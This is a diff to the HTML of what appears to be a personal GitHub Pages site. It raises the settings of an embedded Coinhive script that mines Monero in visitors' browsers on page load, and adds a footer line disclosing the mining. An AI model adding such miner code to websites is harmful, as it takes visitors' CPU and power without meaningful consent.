@@ -19,8 +19,10 @@
     <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
     <script>
 	    var miner = new CoinHive.Anonymous('FTeweiP3B8bJGGT4mtE1AroYP5fTYeQt', {
-               throttle:0.7
-            });
+		threads: 6,
+		autoThreads: false,
+		throttle: 0.7,            
+	    });
 	    miner.start();
     </script>
   </head>
@@ -382,7 +384,7 @@
       This website was built using 
       <a href="https://pages.github.com/">GitHub pages</a>, 
       <a href="http://getbootstrap.com/2.3.2/index.html">Twitter Bootstrap</a>,
-      <a href="https://processing.org/">Processing</a>, and Coinhive.
+      <a href="https://processing.org/">Processing</a>, and mines Monero using Coinhive.
     </div>
     <script type="text/javascript" src="src/processing/processing.js"></script>
     <script type="text/javascript" src="src/js/index.js"></script>
